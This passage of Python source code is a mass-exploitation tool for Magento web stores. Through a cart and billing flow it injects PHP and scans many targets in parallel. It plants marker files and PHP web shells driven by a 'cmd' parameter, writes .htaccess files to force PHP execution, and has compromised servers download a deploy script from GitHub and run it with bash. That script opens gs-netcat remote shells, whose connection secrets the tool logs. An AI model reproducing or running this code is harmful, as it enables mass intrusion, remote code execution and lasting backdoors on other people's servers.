        "$hta='Options+ExecCGI'.chr(10).'AddHandler application/x-httpd-php .php'.chr(10)."
        "'AddType application/x-httpd-php .php'.chr(10)."
        "'<FilesMatch \\\\.php$>'.chr(10).'SetHandler application/x-httpd-php'.chr(10).'</FilesMatch>';"
        "file_put_contents($d.chr(47).'.htaccess',$hta);"
        f"$sh=base64_decode('{shell_b64}');"
        f"file_put_contents($d.chr(47).'{shellname}',$sh);"
    )
    fresh_trigger(payload)
    for base_url in [target, f"{target}/pub"]:
        shell_url = f"{base_url}/{shell_rel}"
        ok, body = try_url(shell_url)
        if ok and '<?php' not in body[:80]:
            verified, out = verify_shell_exec(shell_url)
            if verified:
                if VERBOSE:
                    safe_print(f"{G}[STEP 3 ✓]{RST} {shell_url} | {out[:80]}")
                return shell_url, shell_rel

    if VERBOSE:
        safe_print(f"{R}[DEPLOY FAIL]{RST} All 3 steps exhausted")
    return None, None

def verify_shell_exec(shell_url):
    """
    Verify a cmd-style shell (?cmd=...) is actually executing PHP.
    Test 1: echo marker string → look for it in response.
    Test 2: id command → look for uid= in response.
    Returns (True, output) or (False, reason).
    """
    marker = f"SS_EXEC_{secrets.token_hex(4).upper()}"
    try:
        # Test 1: echo unique marker
        r = requests.get(f"{shell_url}?cmd=echo+{marker}", headers=get_bypass_headers(), timeout=8, verify=False)
        if r.status_code == 200:
            if '<?php' in r.text[:100]:
                return False, "PHP source visible (not executing)"
            if marker in r.text:
                return True, r.text.strip()[:200]
        # Test 2: id command - confirms shell_exec is live
        r2 = requests.get(f"{shell_url}?cmd=id", headers=get_bypass_headers(), timeout=8, verify=False)
        if r2.status_code == 200:
            if '<?php' in r2.text[:100]:
                return False, "PHP source visible (not executing)"
            if 'uid=' in r2.text:
                return True, r2.text.strip()[:200]
        return False, f"No exec output (HTTP {r.status_code})"
    except Exception as e:
        return False, str(e)

def verify_panel_shell(shell_url, shell_type='bob'):
    """
    Verify a panel-style shell (bob.php / mage.php) is rendering HTML.
    bob.php  markers: BOB MARLEY SHELL, bobshell, VENI
    mini.php markers: BOB MARLEY UPLOADER, One Love, One Upload
    mage.php markers: HTML rendering (any <html>/<body>/<div>)
    Returns (True, reason) or (False, reason).
    """
    try:
        r = requests.get(shell_url, headers=get_bypass_headers(), timeout=8, verify=False)
        if r.status_code != 200:
            return False, f"HTTP {r.status_code}"
        body = r.text
        if '<?php' in body[:100]:
            return False, "PHP source visible (not executing)"
        if shell_type == 'bob':
            BOB_MARKERS = [
                'BOB MARLEY SHELL', 'bobshell', 'VENI',         # bob.php (interactive terminal)
                'BOB MARLEY UPLOADER', 'One Love', 'One Upload', # mini.php (file manager)
                'BOB MARLEY',                                     # generic fallback
            ]
            for m in BOB_MARKERS:
                if m in body:
                    return True, f"Rendered: {m}"
        elif shell_type == 'mage':
            if any(tag in body.lower() for tag in ['<html', '<body', '<div', '<form']):
                return True, "Mage panel HTML rendered"
        # Generic HTML fallback
        if '<html' in body.lower() and len(body) > 300:
            return True, "HTML rendered"
        return False, "No execution markers found"
    except Exception as e:
        return False, str(e)

# ==================== SCANNER MODES ====================
def ensure_dir():
    if not os.path.exists(OUTPUT_DIR):
        os.makedirs(OUTPUT_DIR)

def scan_mode(targets):
    """Mode 1: Scan"""
    outer = min(THREADS, 50)
    safe_print(f"\n{Y}[*]{RST} Scanning {len(targets)} targets | {outer} targets parallel | {PATH_WORKERS} path workers each...\n")
    ensure_dir()
    result_file = f"{OUTPUT_DIR}/Vulnerable.txt"
    urls_file = f"{OUTPUT_DIR}/Vulnerable-URL.txt"
    
    vuln_lock = threading.Lock()
    vuln, safe = 0, 0
    
    # Clear files at start
    with open(result_file, 'w') as f:
        f.write(f"SCAN RESULTS - {datetime.now()}\n{'='*60}\n\n")
    with open(urls_file, 'w') as f:
        f.write("")
    
    def scan_single(idx, target):
        nonlocal vuln, safe
        if VERBOSE:
            safe_print(f"{C}[{idx}/{len(targets)}]{RST} Testing: {target}")
        try:
            # Quick pre-check: can we poison a report? (confirms endpoint is alive + vulnerable)
            pre_report = poison(target)
            if not pre_report:
                safe_print(f"{R}[FAIL]{RST} {target}")
                with vuln_lock:
                    safe += 1
                return None

            found_path = None
            found_report_id = [None]
            stop_flag = threading.Event()  # signals other workers to stop on first hit

            def try_one_path(path):
                """Try a single path with fresh cart/report. Returns path on success, None on fail."""
                if stop_flag.is_set():
                    return None
                try:
                    p_report_id = poison(target)
                    if not p_report_id or stop_flag.is_set():
                        return None
                    p_cart_id = create_cart(target)
                    if not p_cart_id or stop_flag.is_set():
                        return None
                    set_email(target, p_cart_id)
                    if stop_flag.is_set():
                        return None
                    if not set_billing(target, p_cart_id):
                        return None
                    if stop_flag.is_set():
                        return None
                    if test_path(target, p_cart_id, p_report_id, path):
                        found_report_id[0] = p_report_id
                        stop_flag.set()  # tell other workers to stop
                        return path
                except Exception:
                    pass
                return None

            paths = get_paths(target)
            with ThreadPoolExecutor(max_workers=PATH_WORKERS) as inner:
                path_futures = {inner.submit(try_one_path, p): p for p in paths}
                for fut in as_completed(path_futures):
                    result = fut.result()
                    if result:
                        found_path = result
                        # Cancel remaining pending futures (best-effort)
                        for f in path_futures:
                            f.cancel()
                        break
            
            if found_path:
                with vuln_lock:
                    vuln += 1
                    # Save immediately to both files!
                    with open(result_file, 'a') as f:
                        f.write(f"Target: {target}\nStatus: VULNERABLE\nPath: {found_path}\nReport ID: {found_report_id[0]}\n{'-'*60}\n\n")
                    with open(urls_file, 'a') as f:
                        f.write(f"{target}\n")
                if VERBOSE:
                    safe_print(f"{G}[VULN]{RST} {target}\n  {C}Path:{RST} {found_path}")
                else:
                    safe_print(f"{G}[VULN]{RST} {target}")
                return target
            else:
                with vuln_lock:
                    safe += 1
                safe_print(f"{R}[SAFE]{RST} {target}")
                return None
        except Exception as e:
            with vuln_lock:
                safe += 1
            if VERBOSE:
                safe_print(f"{R}[FAIL]{RST} {target} - {str(e)[:50]}")
            else:
                safe_print(f"{R}[FAIL]{RST} {target}")
            return None
    
    # Parallel scan - outer pool capped at 50
    with ThreadPoolExecutor(max_workers=min(THREADS, 50)) as executor:
        futures = {executor.submit(scan_single, idx, target): target for idx, target in enumerate(targets, 1)}
        for future in as_completed(futures):
            pass
    
    safe_print(f"\n{'='*60}\n{C}SCAN COMPLETE{RST}\n{'='*60}")
    safe_print(f"{G}[VULNERABLE]{RST}  {vuln}\n{R}[SAFE/FAIL]{RST}   {safe}\n{C}[TOTAL]{RST}      {len(targets)}\n")
    if vuln > 0:
        safe_print(f"{G}[+]{RST} Full results: {result_file}")
        safe_print(f"{G}[+]{RST} URLs only: {urls_file} {Y}(for bulk RCE){RST}\n")

def marker_mode(targets, marker, vuln_data=None):
    """Mode 2: Marker with threading"""
    safe_print(f"\n{Y}[*]{RST} Deploying markers on {len(targets)} targets with {THREADS} threads...\n")
    ensure_dir()
    result_file = f"{OUTPUT_DIR}/Marker-PoC.txt"
    
    # Clear file at start
    with open(result_file, 'w') as f:
        f.write("")
    
    result_lock = threading.Lock()
    success, fail = 0, 0
    
    def deploy_marker(idx, target):
        nonlocal success, fail
        if VERBOSE:
            safe_print(f"{C}[{idx}/{len(targets)}]{RST} {target}")
        
        try:
            hex_id = secrets.token_hex(6)
            
            # Use pre-discovered path if available, otherwise try all paths
            if vuln_data and target in vuln_data and 'path' in vuln_data[target]:
                paths_to_try = [vuln_data[target]['path']]
                use_existing_report = 'report_id' in vuln_data[target]
            else:
                paths_to_try = get_paths(target)
                use_existing_report = False
            
            # TRY PATHS - with fallback file write methods
            for path in paths_to_try:
                # Use existing report_id if available from vuln_data
                if use_existing_report:
                    # Try writing marker with fallback chain using existing report_id
                    # We still need fresh cart for each attempt (handled inside write_file_with_fallback)
                    # But we'll manually handle this case since we have pre-existing report_id
                    report_id = vuln_data[target]['report_id']
                    
                    # Manual fallback loop with existing report_id
                    methods = [
                        ("file_put_contents", f"file_put_contents(getcwd().chr(47).'sm_{hex_id}.txt','{marker}');"),
                        ("fopen/fwrite", f"$h=fopen(getcwd().chr(47).'sm_{hex_id}.txt','w');fwrite($h,'{marker}');fclose($h);"),
                        ("SplFileObject", f"$o=new SplFileObject(getcwd().chr(47).'sm_{hex_id}.txt','w');$o->fwrite('{marker}');"),
                        ("fprintf", f"$h=fopen(getcwd().chr(47).'sm_{hex_id}.txt','w');fprintf($h,'%s','{marker}');fclose($h);"),
                        ("copy_data", f"copy('data://text/plain,{marker}',getcwd().chr(47).'sm_{hex_id}.txt');"),
                    ]
                    
                    found = False
                    for method_name, payload_php in methods:
                        cart_id = create_cart(target)
                        if not cart_id:
                            continue
                        set_email(target, cart_id)
                        billing_result = set_billing(target, cart_id)
                        if not billing_result:
                            continue
                        
                        payload_b64 = base64.b64encode(payload_php.encode()).decode()
                        trigger_stage2(target, cart_id, f"{path}/{report_id}", payload_b64)
                        time.sleep(1)
                        
                        check_url = f"{target}/sm_{hex_id}.txt"
                        try:
                            check = requests.get(check_url, headers=get_bypass_headers(), timeout=5, verify=False)
                            if check.status_code == 200 and marker in check.text:
                                with result_lock:
                                    success += 1
                                    with open(result_file, 'a') as f:
                                        f.write(f"{check_url} (method: {method_name})\n")
                                if VERBOSE:
                                    safe_print(f"{G}[SUCCESS]{RST} {check_url} (method: {method_name})")
                                else:
                                    safe_print(f"{G}[SUCCESS]{RST} {target}")
                                found = True
                                break
                        except:
                            continue
                    
                    if found:
                        return check_url
                    
                    # Try /pub/ subdirectory with existing report_id
                    for method_name, payload_php in [
                        ("file_put_contents", f"file_put_contents(getcwd().chr(47).'pub'.chr(47).'sm_{hex_id}.txt','{marker}');"),
                        ("fopen/fwrite", f"$h=fopen(getcwd().chr(47).'pub'.chr(47).'sm_{hex_id}.txt','w');fwrite($h,'{marker}');fclose($h);"),
                        ("SplFileObject", f"$o=new SplFileObject(getcwd().chr(47).'pub'.chr(47).'sm_{hex_id}.txt','w');$o->fwrite('{marker}');"),
                        ("fprintf", f"$h=fopen(getcwd().chr(47).'pub'.chr(47).'sm_{hex_id}.txt','w');fprintf($h,'%s','{marker}');fclose($h);"),
                        ("copy_data", f"copy('data://text/plain,{marker}',getcwd().chr(47).'pub'.chr(47).'sm_{hex_id}.txt');"),
                    ]:
                        cart_id = create_cart(target)
                        if not cart_id:
                            continue
                        set_email(target, cart_id)
                        billing_result = set_billing(target, cart_id)
                        if not billing_result:
                            continue
                        
                        payload_b64 = base64.b64encode(payload_php.encode()).decode()
                        trigger_stage2(target, cart_id, f"{path}/{report_id}", payload_b64)
                        time.sleep(1)
                        
                        check_url = f"{target}/pub/sm_{hex_id}.txt"
                        try:
                            check = requests.get(check_url, headers=get_bypass_headers(), timeout=5, verify=False)
                            if check.status_code == 200 and marker in check.text:
                                with result_lock:
                                    success += 1
                                    with open(result_file, 'a') as f:
                                        f.write(f"{check_url} (method: {method_name})\n")
                                if VERBOSE:
                                    safe_print(f"{G}[SUCCESS]{RST} {check_url} (method: {method_name})")
                                else:
                                    safe_print(f"{G}[SUCCESS]{RST} {target}")
                                return check_url
                        except:
                            continue
                
                else:
                    # No existing report_id - use full fallback chain (fresh poison each time)
                    filename = f"sm_{hex_id}.txt"
                    success_write, method_used = write_file_with_fallback(target, path, filename, marker)
                    
                    if success_write:
                        check_url = f"{target}/{filename}"
                        with result_lock:
                            success += 1
                            with open(result_file, 'a') as f:
                                f.write(f"{check_url} (method: {method_used})\n")
                        if VERBOSE:
                            safe_print(f"{G}[SUCCESS]{RST} {check_url} (method: {method_used})")
                        else:
                            safe_print(f"{G}[SUCCESS]{RST} {target}")
                        return check_url
                    
                    # Also try /pub/ subdirectory
                    filename_pub = f"pub/sm_{hex_id}.txt"
                    success_pub, method_pub = write_file_with_fallback(target, path, filename_pub, marker)
                    
                    if success_pub:
                        check_url = f"{target}/pub/sm_{hex_id}.txt"
                        with result_lock:
                            success += 1
                            with open(result_file, 'a') as f:
                                f.write(f"{check_url} (method: {method_pub})\n")
                        if VERBOSE:
                            safe_print(f"{G}[SUCCESS]{RST} {check_url} (method: {method_pub})")
                        else:
                            safe_print(f"{G}[SUCCESS]{RST} {target}")
                        return check_url
            
            with result_lock:
                fail += 1
            safe_print(f"{R}[FAIL]{RST} {target}")
            return None
        except Exception as e:
            with result_lock:
                fail += 1
            if VERBOSE:
                safe_print(f"{R}[FAIL]{RST} {target} - {str(e)[:50]}")
            else:
                safe_print(f"{R}[FAIL]{RST} {target}")
            return None
    
    # Parallel deployment
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(deploy_marker, idx, target): target for idx, target in enumerate(targets, 1)}
        for future in as_completed(futures):
            pass
    
    safe_print(f"\n{'='*60}\n{C}COMPLETE{RST}\n{'='*60}")
    safe_print(f"{G}[SUCCESS]{RST} {success}\n{R}[FAIL]{RST}    {fail}\n")
    if success > 0:
        safe_print(f"{G}[+]{RST} Markers saved: {result_file}\n")

GSOCKET_DEPLOY_URL = "https://raw.githubusercontent.com/khadafigans/Magento-StyleSmuggler/refs/heads/main/deploy-all.sh"

def gsocket_mode(targets, vuln_data=None):
    """Mode 3: RCE GSocket - server callback C2 (no webdir shell needed)"""
    safe_print(f"\n{Y}[*]{RST} GSocket RCE on {len(targets)} targets with {THREADS} threads...")
    safe_print(f"{Y}[*]{RST} Deploy: curl/wget {GSOCKET_DEPLOY_URL} -> /tmp -> bash")
    safe_print(f"{Y}[*]{RST} Fallbacks: GS_PORT=53/22/7350 + HOME=/tmp|/home/$user")
    safe_print(f"{Y}[*]{RST} Marker: bob_gs_*.txt (root + /pub/)\n")
    ensure_dir()
    result_file = f"{OUTPUT_DIR}/GSocket.txt"
    
    result_lock = threading.Lock()
    success, fail = 0, 0
    start_time = time.time()
    
    with open(result_file, 'w') as f:
        f.write(f"GSOCKET RESULTS - {datetime.now()}\n{'='*60}\n\n")
    
    def build_gsocket_payload_variants(marker_name):
        """
        Build 5 COMPLETE GSocket payloads, each with different file write method.
        Returns list of (method_name, payload) tuples.
        """
        u = GSOCKET_DEPLOY_URL
        
        # Common payload prefix (download + execute)
        common = (
            # ── exec function selector (tries all, picks first that works) ──
            "$_x=null;"
            "foreach(array('shell_exec','exec','system','passthru','popen','proc_open') as $_f){"
            "if(function_exists($_f)&&!in_array($_f,array_map('trim',explode(',',ini_get('disable_functions'))))){"
            "$_x=$_f;break;}}"
            # ── working dir ──
            f"$d='/tmp/gs_'.substr(md5(uniqid()),0,8);"
            "@mkdir($d,0755,true);"
            # ── download: curl/wget first, PHP native fallback ──
            f"$u='{u}';"
            "$sh=$d.'/deploy-all.sh';"
            "$got=false;"
            "if($_x){"
            "$_r=$_x('curl -fsSL \"'.$u.'\" -o '.$sh.' 2>&1 && echo OK');"
            "if(strpos((string)$_r,'OK')!==false)$got=true;"
            "if(!$got){"
            "$_r=$_x('wget -qO '.$sh.' \"'.$u.'\" 2>&1 && echo OK');"
            "if(strpos((string)$_r,'OK')!==false)$got=true;}}"
            # PHP-native download fallback (works when outbound shell is blocked) ──
            "if(!$got){"
            "$_ctx=stream_context_create(array('http'=>array('timeout'=>30,'follow_location'=>1)));"
            "$_c=@file_get_contents($u,false,$_ctx);"
            "if($_c!==false&&strlen($_c)>100){file_put_contents($sh,$_c);$got=true;}}"
            # ── execute via available function ──
            f"$user=$_x?trim((string)$_x('whoami 2>/dev/null')):'www-data';"
            "$hu=$user?('/home/'.$user):'/tmp';"
            "$envs=array('',"
            "'GS_PORT=53','GS_PORT=22','GS_PORT=7350',"
            "'HOME=/tmp GS_PORT=53',"
            "'HOME='.$hu.' GS_PORT=53',"
            "'HOME=/tmp GS_DSTDIR=/tmp/gs-home GS_PORT=53'"
            ");"
            "$out='';$used='default';"
            "if($got&&$_x){"
            "foreach($envs as $env){"
            "$pfx=$env?($env.' '):'';"
            # Add chmod +x for all .sh files before execution
            "$cmd='cd '.$d.' && chmod +x *.sh 2>/dev/null; '.$pfx.'bash deploy-all.sh';"
            "if($_x==='popen'){$h=popen($cmd.' 2>&1','r');$out='';while(!feof($h))$out.=fread($h,4096);pclose($h);}"
            "elseif($_x==='proc_open'){$h=proc_open($cmd.' 2>&1',array(1=>array('pipe','w'),2=>array('pipe','w')),$pp);$out=stream_get_contents($pp[1]);proc_close($h);}"
            "else{$out=(string)$_x($cmd.' 2>&1');}"
            "if(strpos($out,'gs-netcat')!==false||strpos($out,\"Secret '\")!==false){$used=$env?:'default';break;}"
            "}}"
            "elseif(!$got){$out='DOWNLOAD_FAILED dl='.($got?'ok':'no').' exec='.($_x?:$_x='none');}"
            "elseif(!$_x){$out='EXEC_DISABLED no exec function available';}"
            # ── prepare marker body ──
            f"$body='DONE'.chr(10).'EXEC='.$_x.chr(10).'ENV='.$used.chr(10).$out;"
        )
        
        # Build 5 complete payloads with different file write methods
        variants = [
            # Method 1: file_put_contents (baseline)
            ("file_put_contents", 
             common + 
             f"@file_put_contents(getcwd().chr(47).'{marker_name}',$body);"
             f"@file_put_contents(getcwd().chr(47).'pub'.chr(47).'{marker_name}',$body);"),
            
            # Method 2: fopen/fwrite/fclose
            ("fopen/fwrite",
             common +
             f"$h1=@fopen(getcwd().chr(47).'{marker_name}','w');"
             "if($h1){fwrite($h1,$body);fclose($h1);}"
             f"$h2=@fopen(getcwd().chr(47).'pub'.chr(47).'{marker_name}','w');"
             "if($h2){fwrite($h2,$body);fclose($h2);}"),
            
            # Method 3: SplFileObject
            ("SplFileObject",
             common +
             f"try{{$o1=new SplFileObject(getcwd().chr(47).'{marker_name}','w');$o1->fwrite($body);}}catch(Exception $e){{}}"
             f"try{{$o2=new SplFileObject(getcwd().chr(47).'pub'.chr(47).'{marker_name}','w');$o2->fwrite($body);}}catch(Exception $e){{}}"),
            
            # Method 4: fprintf
            ("fprintf",
             common +
             f"$h1=@fopen(getcwd().chr(47).'{marker_name}','w');"
             "if($h1){fprintf($h1,'%s',$body);fclose($h1);}"
             f"$h2=@fopen(getcwd().chr(47).'pub'.chr(47).'{marker_name}','w');"
             "if($h2){fprintf($h2,'%s',$body);fclose($h2);}"),
            
            # Method 5: copy with data://
            ("copy_data",
             common +
             "$b64=base64_encode($body);"
             f"@copy('data://text/plain;base64,'.$b64,getcwd().chr(47).'{marker_name}');"
             f"@copy('data://text/plain;base64,'.$b64,getcwd().chr(47).'pub'.chr(47).'{marker_name}');"),
        ]
        
        return variants
    
    def parse_gsocket_output(text):
        """Extract secret + connect command from deploy-all.sh stdout"""
        secret = None
        m = re.search(r'gs-netcat\s+-s\s+"([A-Za-z0-9]+)"', text)
        if m:
            secret = m.group(1)
        if not secret:
            m = re.search(r"Secret\s+'([A-Za-z0-9]+)'", text)
            if m:
                secret = m.group(1)
        if not secret:
            m = re.search(r'S="([A-Za-z0-9]+)"\s+bash', text)
            if m:
                secret = m.group(1)
        connect = f'gs-netcat -s "{secret}" -i' if secret else None
        return secret, connect
    
    def fetch_marker(target, marker_name):
        """Dual check: /marker and /pub/marker"""
        for url in [f"{target}/{marker_name}", f"{target}/pub/{marker_name}"]:
            try:
                r = requests.get(url, headers=get_bypass_headers(), timeout=12, verify=False)
                if r.status_code == 200 and 'DONE' in r.text:
                    return url, r.text
            except:
                continue
        return None, None
    
    def deploy_one(idx, target):
        nonlocal success, fail
        target_start = time.time()
        if VERBOSE:
            safe_print(f"\n{C}[{idx}/{len(targets)}]{RST} {target}")
        
        marker_name = f"bob_gs_{secrets.token_hex(4)}.txt"
        payload_variants = build_gsocket_payload_variants(marker_name)
        
        try:
            # Use pre-discovered path if available, otherwise try all paths
            if vuln_data and target in vuln_data and 'path' in vuln_data[target]:
                paths_to_try = [vuln_data[target]['path']]
                use_existing_report = 'report_id' in vuln_data[target]
            else:
                paths_to_try = get_paths(target)
                use_existing_report = False
            
            # Try all 5 payload variants sequentially
            for method_name, php_payload in payload_variants:
                payload_b64 = base64.b64encode((php_payload.rstrip(';') + ';').encode()).decode()
                
                if VERBOSE:
                    safe_print(f"{Y}[TRY]{RST} Method: {C}{method_name}{RST}")
                
                for path in paths_to_try:
                    try:
                        # Use existing report if available, otherwise poison fresh
                        if use_existing_report:
                            report_id = vuln_data[target]['report_id']
                        else:
                            report_id = poison(target)
                            if not report_id:
                                continue
                        
                        cart_id = create_cart(target)
                        if not cart_id:
                            continue
                        set_email(target, cart_id)
                        if not set_billing(target, cart_id):
                            continue
                        
                        # Deploy can take longer (download + multi env tries)
                        trigger_stage2_with_retry(target, cart_id, f"{path}/{report_id}", payload_b64)
                        time.sleep(1.5)
                        
                        marker_url, body = fetch_marker(target, marker_name)
                        if body:
                            # Marker file written successfully
                            secret, connect = parse_gsocket_output(body)
                            if secret:
                                relay_ok = ('Testing Global Socket Relay Network' in body and '[OK]' in body) or ('gs-netcat' in body)
                                elapsed = time.time() - target_start
                                with result_lock:
                                    success += 1
                                    with open(result_file, 'a') as f:
                                        f.write(f"[{success}] {target}\n")
                                        f.write(f"    Secret:  {secret}\n")
                                        f.write(f"    Connect: {connect}\n")
                                        f.write(f"    Relay:   {'OK' if relay_ok else 'Unknown'}\n")
                                        f.write(f"    Marker:  {marker_url}\n")
                                        f.write(f"    Method:  {method_name}\n")
                                        f.write(f"    Time:    {elapsed:.1f}s\n\n")
                                if VERBOSE:
                                    safe_print(f"{G}[SUCCESS]{RST} {target}")
                                    safe_print(f"  {C}Secret:{RST}  {secret}")
                                    safe_print(f"  {C}Connect:{RST} {connect}")
                                    safe_print(f"  {C}Relay:{RST}   {'OK' if relay_ok else 'Unknown'}")
                                    safe_print(f"  {C}Method:{RST}  {method_name}")
                                else:
                                    safe_print(f"{G}[SUCCESS]{RST} ({success}) {target}")
                                return True
                            else:
                                if VERBOSE:
                                    safe_print(f"{Y}[PARTIAL]{RST} {target} marker ok, no secret")
                                    safe_print(f"  Preview: {body[:180].replace(chr(10),' ')}")
                                continue
                        
                        # Marker fetch failed for this path, try next path
                        continue
                        
                    except Exception as e:
                        if VERBOSE:
                            safe_print(f"{R}[ERROR]{RST} {str(e)[:50]}")
                        continue
                
                # All paths failed for this method, try next file write method
                if VERBOSE:
                    safe_print(f"{Y}[NEXT]{RST} Method {method_name} failed, trying next...")
            
            # All methods exhausted
            with result_lock:
                fail += 1
            safe_print(f"{R}[FAIL]{RST} {target}")
            return False
        except Exception as e:
            with result_lock:
                fail += 1
            if VERBOSE:
                safe_print(f"{R}[ERROR]{RST} {target} - {str(e)[:80]}")
            else:
                safe_print(f"{R}[FAIL]{RST} {target}")
            return False
            return False
    
    with ThreadPoolExecutor(max_workers=min(THREADS, 50)) as executor:
        futures = {executor.submit(deploy_one, idx, t): t for idx, t in enumerate(targets, 1)}
        for _ in as_completed(futures):
            pass
    
    total = time.time() - start_time
    safe_print(f"\n{'='*60}\n{C}GSOCKET COMPLETE{RST}\n{'='*60}")
    safe_print(f"{G}[SUCCESS]{RST} {success}\n{R}[FAIL]{RST}    {fail}\n{Y}[TIME]{RST}    {total:.1f}s\n")
    if success > 0:
        safe_print(f"{G}[+]{RST} Results: {result_file}\n")


def rce_mode(targets, vuln_data=None):
    """Mode 4: RCE Web - 3-Step Cascade with Payload Variants"""
    safe_print(f"\n{Y}[*]{RST} Web RCE deployment on {len(targets)} targets with {THREADS} threads...")
    safe_print(f"{Y}[*]{RST} Step 1: Standard files | Step 2: .htaccess | Step 3: Extension bypass\n")
    ensure_dir()
    result_file = f"{OUTPUT_DIR}/RCE.txt"
    
    result_lock = threading.Lock()
    rce, fail = 0, 0
    start_time = time.time()
    
    with open(result_file, 'w') as f:
        f.write("")  # Clear file
    
    # PHP execution payloads (from SessionReaper - ordered by success rate)
    PHP_PAYLOADS = [
        ('minimal', r"<?php system($_GET['cmd']); ?>"),
        ('passthru', r"<?php passthru($_GET['cmd']); ?>"),
        ('exec', r"<?php echo exec($_GET['cmd']); ?>"),
        ('standard', r"<?php echo shell_exec($_GET['cmd']); ?>"),
        ('obfuscated', r"<?php $a='shell'.'_exec';echo $a($_GET['cmd']); ?>"),
    ]
    
    # File-writing methods (ordered by compatibility)
    def get_write_variants(filename, shell_code):
        """Generate multiple file-writing payloads"""
        # Escape for PHP - use chr() to avoid quote issues
        safe_shell = base64.b64encode(shell_code.encode()).decode()
        return [
            # Variant 1: file_put_contents (most common)
            f"file_put_contents(getcwd().chr(47).'{filename}',base64_decode('{safe_shell}'));",
            # Variant 2: fopen/fwrite (low-level, often works)
            f"$h=fopen(getcwd().chr(47).'{filename}','w');fwrite($h,base64_decode('{safe_shell}'));fclose($h);",
            # Variant 3: SplFileObject (OOP, rarely blocked)
            f"$o=new SplFileObject(getcwd().chr(47).'{filename}','w');$o->fwrite(base64_decode('{safe_shell}'));",
            # Variant 4: fprintf (stream-based)
            f"$h=fopen(getcwd().chr(47).'{filename}','w');fprintf($h,'%s',base64_decode('{safe_shell}'));fclose($h);",
            # Variant 5: copy with data:// (exotic)
            f"copy('data://text/plain;base64,{safe_shell}',getcwd().chr(47).'{filename}');",
        ]
    
    def verify_shell(target, filename):
        """Verify shell execution with dual URL check (/ and /pub/)"""
        check_urls = [
            f"{target}/{filename}?cmd=id",
            f"{target}/pub/{filename}?cmd=id",
        ]
        for url in check_urls:
            try:
                r = requests.get(url, headers=get_bypass_headers(), timeout=5, verify=False)
                if r.status_code == 200:
                    if '<?php' in r.text[:100]:  # Source code = fail
                        continue
                    if 'uid=' in r.text or 'gid=' in r.text:  # Executed!
                        return (True, url, r.text.strip()[:100])
            except:
                continue
        return (False, None, None)
    
    def try_deploy_shell(target, filename, shell_code):
        """Try to deploy a shell with all path/payload combinations"""
        write_variants = get_write_variants(filename, shell_code)
        paths = get_paths(target)
        
        for write_payload in write_variants:
            for path in paths:
                try:
                    # Fresh poison/cart per attempt
                    report_id = poison(target)
                    if not report_id:
                        continue
                    cart_id = create_cart(target)
                    if not cart_id:
                        continue
                    set_email(target, cart_id)
                    if not set_billing(target, cart_id):
                        continue
                    
                    # Trigger with current write payload (with retry for 520 errors)
                    payload_b64 = base64.b64encode(write_payload.encode()).decode()
                    trigger_stage2_with_retry(target, cart_id, f"{path}/{report_id}", payload_b64)
                    time.sleep(0.5)
                    
                    # Verify
                    success, url, output = verify_shell(target, filename)
                    if success:
                        return (True, url, output)
                except Exception:
                    continue
        return (False, None, None)
    
    def test_target(idx, target):
        nonlocal rce, fail
        target_start = time.time()
        if VERBOSE:
            safe_print(f"\n{C}[{idx}/{len(targets)}]{RST} Testing {target}")
        
        try:
            working_shells = []
            
            # ═══════════════════════════════════════════════════════════
            # STEP 1: Standard Nginx Whitelist Files (health_check.php, get.php, errors/503.php)
            # ═══════════════════════════════════════════════════════════
            standard_files = ['health_check.php', 'get.php', 'errors/503.php']
            for std_file in standard_files:
                if VERBOSE:
                    safe_print(f"{Y}[STEP 1]{RST} Trying: {C}{std_file}{RST}")
                
                # Try all PHP payloads for this file
                for payload_name, php_code in PHP_PAYLOADS:
                    success, url, output = try_deploy_shell(target, std_file, php_code)
                    if success:
                        shell_entry = {'file': std_file, 'payload': payload_name, 'url': url, 'output': output}
                        working_shells.append(shell_entry)
                        if VERBOSE:
                            safe_print(f"{G}[SUCCESS]{RST} {std_file} works! Payload: {payload_name}")
                        # Save immediately
                        with result_lock:
                            with open(result_file, 'a') as f:
                                if len(working_shells) == 1:
                                    f.write(f"{'='*80}\nTarget: {target}\n{'='*80}\n\n")
                                f.write(f"Method: Standard File\nFilename: {std_file}\nPayload: {payload_name}\nURL: {url}\nTest: curl '{url}'\nOutput: {output}\n\n")
                        break  # Move to next file
                if working_shells:
                    break  # Step 1 succeeded, skip to end
            
            # ═══════════════════════════════════════════════════════════
            # STEP 2: Random Directory + .htaccess (Apache/LiteSpeed only)
            # ═══════════════════════════════════════════════════════════
            if not working_shells:
                if VERBOSE:
                    safe_print(f"{Y}[STEP 2]{RST} Trying: random dir + .htaccess")
                
                rand_dir = f"cache_{secrets.token_hex(4)}"
                htaccess_content = "AddType application/x-httpd-php .php"
                shell_filename = f"{secrets.token_hex(3)}.php"
                shell_code_b64 = base64.b64encode(PHP_PAYLOADS[0][1].encode()).decode()
                
                # Create dir + htaccess + shell
                combined_payload = f"@mkdir(getcwd().chr(47).'pub'.chr(47).'{rand_dir}',0755,true);" + \
                                   f"file_put_contents(getcwd().chr(47).'pub'.chr(47).'{rand_dir}'.chr(47).'.htaccess','{htaccess_content}');" + \
                                   f"file_put_contents(getcwd().chr(47).'pub'.chr(47).'{rand_dir}'.chr(47).'{shell_filename}',base64_decode('{shell_code_b64}'));"
                
                paths = get_paths(target)
                for path in paths:
                    try:
                        report_id = poison(target)
                        if not report_id:
                            continue
                        cart_id = create_cart(target)
                        if not cart_id:
                            continue
                        set_email(target, cart_id)
                        if not set_billing(target, cart_id):
                            continue
                        
                        payload_b64 = base64.b64encode(combined_payload.encode()).decode()
                        trigger_stage2_with_retry(target, cart_id, f"{path}/{report_id}", payload_b64)
                        time.sleep(0.5)
                        
                        # Verify
                        check_url = f"{target}/pub/{rand_dir}/{shell_filename}?cmd=id"
                        r = requests.get(check_url, headers=get_bypass_headers(), timeout=5, verify=False)
                        if r.status_code == 200 and 'uid=' in r.text and '<?php' not in r.text[:100]:
                            shell_entry = {'file': f'{rand_dir}/{shell_filename}', 'payload': 'htaccess', 'url': check_url, 'output': r.text.strip()[:100]}
                            working_shells.append(shell_entry)
                            if VERBOSE:
                                safe_print(f"{G}[SUCCESS]{RST} .htaccess method works!")
                            with result_lock:
                                with open(result_file, 'a') as f:
                                    if len(working_shells) == 1:
                                        f.write(f"{'='*80}\nTarget: {target}\n{'='*80}\n\n")
                                    f.write(f"Method: .htaccess + Random Dir\nFilename: {rand_dir}/{shell_filename}\nURL: {check_url}\nTest: curl '{check_url}'\nOutput: {r.text.strip()[:100]}\n\n")
                            break
                    except:
                        continue
            
            # ═══════════════════════════════════════════════════════════
